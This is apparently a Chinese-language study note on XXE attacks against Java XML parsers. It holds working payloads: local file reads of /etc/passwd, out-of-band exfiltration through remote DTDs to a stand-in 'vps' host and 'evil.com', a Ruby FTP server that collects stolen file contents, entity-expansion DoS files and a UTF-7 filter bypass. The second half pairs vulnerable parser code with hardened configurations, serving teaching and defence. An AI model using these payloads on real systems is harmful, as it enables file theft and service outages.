

# Java中的XXE

## 写在前面

什么是xml？什么是xxe？就不必多说了既然都学java安全了必然不是小白，当然如果是可以百度搜索一下

## 内部实体与外部实体

这个概念还算比较重要故此特地记录一下

内部实体：如果一个实体是在DTD中声明的，它就被称为内部实体。
例如：&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;

外部实体：如果一个实体在DTD之外被声明，那么它就被称为外部实体，由SYSTEM标识。
例如：&lt;!ENTITY entity_name SYSTEM &quot;entity_value&quot;&gt;



## XXE-Payload

简单的demo用Java自带库实现xml解析，代码内容及其简单并且带回显

```java
String result = "";
try {
  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
  DocumentBuilder db = dbf.newDocumentBuilder();
  Document doc = db.parse("file:///Users/y4tacker/Desktop/1.xml");

  String username = doc.getElementsByTagName("username").item(0).getFirstChild().getNodeValue();
  String password = doc.getElementsByTagName("password").item(0).getFirstChild().getNodeValue();
  if(username.equals("admin") && password.equals("1223456")){
    result = String.format("<result><code>%d</code><msg>%s</msg></result>",1,username);
  }else{
    result = String.format("<result><code>%d</code><msg>%s</msg></result>",0,username);
  }
} catch (Exception e) {
  e.printStackTrace();
  result = String.format("<result><code>%d</code><msg>%s</msg></result>",3,e.getMessage());
}
System.out.println(result);
```

### 基础回显

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test[
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><username>&xxe;</username><password>123456</password></user>
```

![](img/1.png)



### 远程dtd读取

前提可出网，通常用于无回显的场景

```xml
<?xml version='1.0'?>
<!DOCTYPE RemoteDTD SYSTEM "http://vps/evil.dtd" >
<root>&send;</root>
```

或

```xml
<?xml version="1.0"?>
<!DOCTYPE xxe [
<!ENTITY % dtd SYSTEM "http://vps/evil.dtd">
%dtd;]>
<comment>
	<text>&send;</text>
</comment>
```

Evil.dtd内容

```dtd
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///tmp/1.txt">
<!ENTITY % print "<!ENTITY send SYSTEM 'http://vps:port/?%file;'>">
%print;
```



> 这一部构造参数实体 print，再执行得到send命名实体是必要的。命名实体内部不会解析参数实体



![](img/2.png)

但是有个问题就是如果是多行的文件就无法读取，目前暂时不清楚解决方法

### 结合本地dtd文件

上面那个你会想说能不能只发送远程请求不加载dtd？答案是可以的，具体原理可以参考[exploiting-xxe-with-local-dtd-files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)，之所以需要引入外部实体，是因为内部DTD不允许我们在实体中包含一个实体



```xml
<!DOCTYPE root [
        <!ENTITY % local_dtd SYSTEM "jar:file:///tmp/jboss-xacml-2.0.8.Final.jar!/schema/xmlschema/XMLSchema.dtd">
        <!ENTITY % xs-datatypes ' <!ENTITY &#x25; file SYSTEM "file:///tmp/1.txt">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;http://vp s:port/&#x25;file;&#x27;>">
&#x25;eval;&#x25;error;'>

        %local_dtd;
        ]>
<root>
    <username>test</username>
</root>
```

![](img/4.png)



但是这又有一个问题，问题但关键在于如何找到对方服务器上可注入的dtd，2019年7月，有国外大佬已经完美解决了这个问题，[点我](https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html)并提供了工具[dtd-finder](https://github.com/GoSecure/dtd-finder)，工具中具有已知漏洞的dtd列表文件

在测试时只需要遍历存在已知漏洞的dtd文件，查看是否存在，存在的话照着参数利用即可。



当然如果服务器能抛出异常信息的话我们能多行语句更便捷读取文件

```xml
<!DOCTYPE root [
        <!ENTITY % local_dtd SYSTEM "jar:file:///tmp/jboss-xacml-2.0.8.Final.jar!/schema/xmlschema/XMLSchema.dtd">
        <!ENTITY % xs-datatypes ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;file;&#x27;>">
&#x25;eval;&#x25;error;'>

        %local_dtd;
        ]>
<root>
    <username>test</username>
</root>
```

![](img/5.png)

很好玩，不过还是用简单的payload单独记录下



### 结合报错获取信息

有时候如果xxe当中如果服务端没有正确处理好使用try catch，那么如果抛出异常web界面通常会显示这个错误，因此构造即可，这里我们用远程dtd配合演示

```xml
<?xml version='1.0'?>
<!DOCTYPE RemoteDTD SYSTEM "http://vps/evil.dtd" >
<root>&send;</root>
```

evil.dtd

```xml
<!ENTITY % evil SYSTEM "file:///" >
<!ENTITY % print "<!ENTITY send SYSTEM 'netdoc://%evil;'>">
%print;
```

很神奇对吧，同时java的伪协议file与netdoc(但netdoc不是每个版本都有，具体可以在`sun.net.www.protocol`包下看到)不仅仅可以读取文件同时可以读取目录，这一点是很重要的trick

![](img/6.png)

### 解决文件跨行传输——ftp&jdk1.7+

在XXE盲注中，我们也提到通过http协议访问我们的服务器会只获取被读取的文件第一行。

参考[XXE OOB exploitation at Java 1.7+](http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html)这篇文章，在特定情况下我们可以解决这种困境。

在jdk1.7以前，可以通过http协议传输具有换行的文件的。因为java会对换行符进行URL编码然后就访问一个地址。

但是1.7之后，就修复了这个问题，会报错。

但是我们仍然可以用ftp服务器来接受换行文件，因为ftp没有进行类似的限制，换行之后的字符会被当做CWD命令输入。

只要起一个[恶意的FTP服务器](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)，其他按照正常的XXE盲注打就好了。

```
<!ENTITY % b SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://127.0.0.1:2121/%b;'>">
%c;
```

payload:

```
<?xml version="1.0"?>
<!DOCTYPE a [
   <!ENTITY % asd SYSTEM "http://vps:8088/"> 
   %asd; 
   %rrr; 
]>
<a></a>
```

启动ftp-server

```ruby
require 'socket'

ftp_server = TCPServer.new 2121
http_server = TCPServer.new 8088

log = File.open( "xxe-ftp.log", "a")

payload = '<!ENTITY % b SYSTEM "file:///tmp/1.txt">
           <!ENTITY % c "<!ENTITY &#37; rrr SYSTEM \'ftp://127.0.0.1:2121/%b;\'>">
           %c;'

Thread.start do
loop do
  Thread.start(http_server.accept) do |http_client|
	puts "HTTP. New client connected"
	loop {
		req = http_client.gets()
		break if req.nil?
		if req.start_with? "GET"
			http_client.puts("HTTP/1.1 200 OK\r\nContent-length: #{payload.length}\r\n\r\n#{payload}")
		end
		puts req
	}
	puts "HTTP. Connection closed"
  end
end

end

Thread.start do
loop do
  Thread.start(ftp_server.accept) do |ftp_client|
	puts "FTP. New client connected"
	ftp_client.puts("220 xxe-ftp-server")
	loop {
		req = ftp_client.gets()
		break if req.nil?
		puts "< "+req
		log.write "get req: #{req.inspect}\n"

		if req.include? "LIST"
			ftp_client.puts("drwxrwxrwx 1 owner group          1 Feb 21 04:37 test")
			ftp_client.puts("150 Opening BINARY mode data connection for /bin/ls")
			ftp_client.puts("226 Transfer complete.")
		elsif req.include? "USER"
			ftp_client.puts("331 password please - version check")
		elsif req.include? "PORT"
			puts "! PORT received"
			puts "> 200 PORT command ok"
			ftp_client.puts("200 PORT command ok")
		else
			puts "> 230 more data please!"
			ftp_client.puts("230 more data please!")
		end
	}
	puts "FTP. Connection closed"
  end
end
end

loop do
	sleep(10000)
end
```

最终效果如下：

![](img/3.png)

发出的ftp:// url格式也可以使用username:password的形式。

```
ftp://%b:password@evil.com:8000
```

但是显而易见这要求`%b`这个文件内容中不包含`:`不然就会，格式报错。所以还是前者比较好



### DOS攻击

经典的用于DoS的xml文件样例如下，原理为构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中,这个在其他编程语言或者JDK版本较低的Java中可利用，但在高版本JDK的环境中会报错中断解析：

![](img/2.png)

当然，这种类型的DoS攻击也支持参数实体的方式。将dos.xml修改如下：

```xml
<!DOCTYPE data SYSTEM "http://vps/dos.dtd" [
<!ELEMENT data (#PCDATA)>
]>
<data>&tea;</data>
```

在攻击者服务器放置dos.dtd：

```xxe
<!ENTITY % a0 "dos" >
<!ENTITY % a1 "%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;">
<!ENTITY % a2 "%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;">
<!ENTITY % a3 "%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;">
<!ENTITY % a4 "%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;">
<!ENTITY tea "%a4;" >
```

当然还可以通过递归来造成dos

```xxe
<!DOCTYPE data [
<!ENTITY a "a&b;" >
<!ENTITY b "&a;" >
]>
<data>&a;</data>
```

引用位于网上或本地的一个大文件让解析器解析一个 **巨大的 XML 文件**从而导致DoS

## 绕waf可用姿势

### 协议绕过

可能支持的协议有`http/https/ftp/file/jar/netdoc/mailto/gopher`等但是不同版本支持的协议不一致，具体可以在具体java版本下的`sun.net.www.protocol`包下看到，这里不多讲了



### 编码绕过

比如使用utf7

原来

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE ANY [
  <!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>
```

转换后

```xml
<?xml version="1.0" encoding="utf-7" ?>
+ADwAIQ-DOCTYPE ANY +AFs-
  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-
+AF0APg-
+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-
```



## 一些可能造成xxe的组件及修复方式

```java
javax.xml.parsers.DocumentBuilderFactory;
javax.xml.parsers.SAXParser
javax.xml.transform.TransformerFactory
javax.xml.validation.Validator
javax.xml.validation.SchemaFactory
javax.xml.transform.sax.SAXTransformerFactory
javax.xml.transform.sax.SAXSource
org.xml.sax.XMLReader
DocumentHelper.parseText
DocumentBuilder
org.xml.sax.helpers.XMLReaderFactory
org.dom4j.io.SAXReader
org.jdom.input.SAXBuilder
org.jdom2.input.SAXBuilder
javax.xml.bind.Unmarshaller
javax.xml.xpath.XpathExpression
javax.xml.stream.XMLStreamReader
org.apache.commons.digester3.Digester
rg.xml.sax.SAXParseExceptionpublicId
```

### DocumentBuilder

java组件：javax.xml.parsers.*

组件漏洞代码：

```java
public static void main(String[] args) throws  Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    String str = "<!DOCTYPE doc [ \n" +
    "<!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\">\n" +
    "]><doc>&xxe;</doc>";
    InputStream is = new ByteArrayInputStream(str.getBytes());
    Document doc = db.parse(is);
}
```

修复代码：

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();     
/*以下为修复代码*/            //https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java
//禁用DTDs (doctypes),几乎可以防御所有xml实体攻击
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); //首选
//如果不能禁用DTDs,可以使用下两项，必须两项同时存在
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);        //防止外部实体POC 
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);   //防止参数实体POC
/*以上为修复代码*/    
DocumentBuilder db = dbf.newDocumentBuilder();        
Document doc = db.parse(request.getInputStream());
```

或

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
String FEATURE = null;
try {
FEATURE = "http://apache.org/xml/features/disallow-doctype-decl";
dbf.setFeature(FEATURE, true);
// If you can't completely disable DTDs, then at least do the following:
// Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-general-entities
// Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-general-entities
// JDK7+ - http://xml.org/sax/features/external-general-entities
FEATURE = "http://xml.org/sax/features/external-general-entities";
dbf.setFeature(FEATURE, false);
// Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-parameter-entities
// Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-parameter-entities
// JDK7+ - http://xml.org/sax/features/external-parameter-entities
FEATURE = "http://xml.org/sax/features/external-parameter-entities";
dbf.setFeature(FEATURE, false);
// Disable external DTDs as well
FEATURE = "http://apache.org/xml/features/nonvalidating/load-external-dtd";
dbf.setFeature(FEATURE, false);
// and these as well, per Timothy Morgan's 2014 paper: "XML Schema, DTD, and Entity Attacks"
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
>..
// Load XML file or stream using a XXE agnostic configured parser...
DocumentBuilder safebuilder = dbf.newDocumentBuilder();
```

### SAXBuilder

java组件：org.jdom2.input.SAXBuilder

漏洞代码：

```java
public static void main(String[] args) throws  Exception {
    String str = "<!DOCTYPE doc [ \n" +
    "<!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\">\n" +
    "]><doc>&xxe;</doc>";
    InputStream is = new ByteArrayInputStream(str.getBytes());
    SAXBuilder sb = new SAXBuilder();
    Document doc = sb.build(is);
}
```

修复代码：

```java
SAXBuilder sb = new SAXBuilder();
sb.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
sb.setFeature("http://xml.org/sax/features/external-general-entities", false);
sb.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
sb.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
Document doc = sb.build(is);
```

### SAXParserFactory

java组件：javax.xml.parsers.SAXParser / javax.xml.parsers.SAXParserFactory

漏洞代码：

```java
public static void main(String[] args) throws  Exception {
    String str = "<!DOCTYPE doc [ \n" +
    "<!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\">\n" +
    "]><doc>&xxe;</doc>";
    InputStream is = new ByteArrayInputStream(str.getBytes());
    SAXParserFactory spf = SAXParserFactory.newInstance();
    SAXParser parser = spf.newSAXParser();
    parser.parse(is, (HandlerBase) null);
}
```

修复代码

```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
SAXParser parser = spf.newSAXParser();
```

### SAXTransformerFactory

java组件：javax.xml.transform.sax.SAXTransformerFactory。

漏洞代码：

```java
public static void main(String[] args) throws  Exception {
    String str = "<!DOCTYPE doc [ \n" +
    "<!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\">\n" +
    "]><doc>&xxe;</doc>";
    InputStream is = new ByteArrayInputStream(str.getBytes());
    SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();
    StreamSource source = new StreamSource(is);
    sf.newTransformerHandler(source);
}
```

修复代码：

```java
SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();
sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
StreamSource source = new StreamSource(is);
sf.newTransformerHandler(source);
```

### SAXReader

java组件：org.dom4j.io.SAXReader

漏洞代码：

```java
public static void main(String[] args) throws  Exception {
    String str = "<!DOCTYPE doc [ \n" +
    "<!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\">\n" +
    "]><doc>&xxe;</doc>";
    InputStream is = new ByteArrayInputStream(str.getBytes());
    SAXReader saxReader = new SAXReader();
    saxReader.read(is);
}
```

修复代码：

```java
SAXReader saxReader = new SAXReader();
saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
saxReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
saxReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
saxReader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
saxReader.read(is);
```

### XMLReader

java组件：org.xml.sax.helpers.XMLReaderFactory

漏洞代码：

```java
public static void main(String[] args) throws Exception {
    String str = "<!DOCTYPE doc [ \n" +
    "<!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\">\n" +
    "]><doc>&xxe;</doc>";
    InputStream is = new ByteArrayInputStream(str.getBytes());
    XMLReader reader = XMLReaderFactory.createXMLReader();
    reader.parse(new InputSource(is));
}
```

修复代码：

```java
XMLReader reader = XMLReaderFactory.createXMLReader();
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
reader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
reader.parse(new InputSource(is));
```

### SchemaFactory

java组件：javax.xml.validation.SchemaFactory

漏洞代码：

```java
public static void main(String[] args) throws Exception {
    String str = "<!DOCTYPE doc [ \n" +
    "<!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\">\n" +
    "]><doc>&xxe;</doc>";
    InputStream is = new ByteArrayInputStream(str.getBytes());
    SchemaFactory factory = SchemaFactory.newInstance("http://www.w3.org/2001/XMLSchema");
    StreamSource source = new StreamSource(is);
    Schema schema = factory.newSchema(source);
}
```

修复代码：

```java
SchemaFactory factory = SchemaFactory.newInstance("http://www.w3.org/2001/XMLSchema");
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
StreamSource source = new StreamSource(is);
Schema schema = factory.newSchema(source);
```

### XMLInputFactory

java组件：javax.xml.stream.XMLInputFactory

漏洞代码：

```java
public static void main(String[] args) throws Exception {
    XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();
    XMLStreamReader reader = xmlInputFactory.createXMLStreamReader(ResourceUtils.getPoc1());
    try {
        while (reader.hasNext()) {
            int type = reader.next();
            if (type == XMLStreamConstants.START_ELEMENT) {//开始节点
            System.out.print(reader.getName());
            } else if (type == XMLStreamConstants.CHARACTERS) {//表示事件字符
            System.out.println("type" + type);
            } else if (type == XMLStreamConstants.END_ELEMENT) {//结束节点
            System.out.println(reader.getName());
            }
        }
        reader.close();
    } catch (Exception e) {
    	e.printStackTrace();
    }
}
```

修复代码：

```java
XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();
xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false); 
xmlInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
XMLStreamReader reader = xmlInputFactory.createXMLStreamReader(ResourceUtils.getPoc1());
```

### TransformerFactory

java组件：javax.xml.transform.TransformerFactory

漏洞代码：

```java
public static void main(String[] args) throws  Exception {
    String str = "<!DOCTYPE doc [ \n" +
    "<!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\">\n" +
    "]><doc>&xxe;</doc>";
    InputStream is = new ByteArrayInputStream(str.getBytes());
    TransformerFactory tf = TransformerFactory.newInstance();
    StreamSource source = new StreamSource(is);
    tf.newTransformer().transform(source, new DOMResult());
}
```

修复代码：

```java
TransformerFactory tf = TransformerFactory.newInstance();
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
StreamSource source = new StreamSource(is);
tf.newTransformer().transform(source, new DOMResult());
```

### Validator

java组件：javax.xml.validation.*

漏洞代码：

```java
public static void main(String[] args) throws  Exception {
    String str = "<!DOCTYPE doc [ \n" +
    "<!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\">\n" +
    "]><doc>&xxe;</doc>";
    InputStream is = new ByteArrayInputStream(str.getBytes());
    SchemaFactory factory = SchemaFactory.newInstance("http://www.w3.org/2001/XMLSchema");
    Schema schema = factory.newSchema();
    Validator validator = schema.newValidator();
    StreamSource source = new StreamSource(is);
    validator.validate(source);
}
```

修复代码：

```java
Schema schema = factory.newSchema();
Validator validator = schema.newValidator();
validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
StreamSource source = new StreamSource(is);
validator.validate(source);
```

### Unmarshaller

java组件：javax.xml.bind.JAXBContext / javax.xml.bind.Unmarshaller

> 需要指出：这个组件在jdk1.8默认不存在漏洞，在JDK1.6，1.7默认存在漏洞。[参考](https://anquan.baidu.com/article/315)

漏洞代码：

```java
public static Object xmlToObjectXXE(String xml, Class<?> klass) throws Exception {
	JAXBContext context = JAXBContext.newInstance(klass);
	Unmarshaller unmarshaller = context.createUnmarshaller();
	return unmarshaller.unmarshal(new StringReader(xml));
}
```

修复代码:

```java
public static Object xmlToObjectSafe(String xml, Class<?> klass) throws Exception {
	JAXBContext context = JAXBContext.newInstance(klass);

	XMLInputFactory xif = XMLInputFactory.newFactory();
	xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
	xif.setProperty(XMLInputFactory.SUPPORT_DTD, true);
	XMLStreamReader xsr = xif.createXMLStreamReader(new StringReader(xml));

	Unmarshaller unmarshaller = context.createUnmarshaller();
	return unmarshaller.unmarshal(xsr);
}
```

当**IS_SUPPORTING_EXTERNAL_ENTITIES**为false时，外部实体不会被执行解析
当**SUPPORT_DTD**进一步为false时，引入DTD会导致报错。

## 参考文章

https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

https://xz.aliyun.com/t/9505

https://lalajun.github.io/2019/12/03/WEB-XXE/#JAVA%E7%BB%84%E4%BB%B6%E6%A1%88%E4%BE%8B

https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#jaxb-unmarshaller

https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/
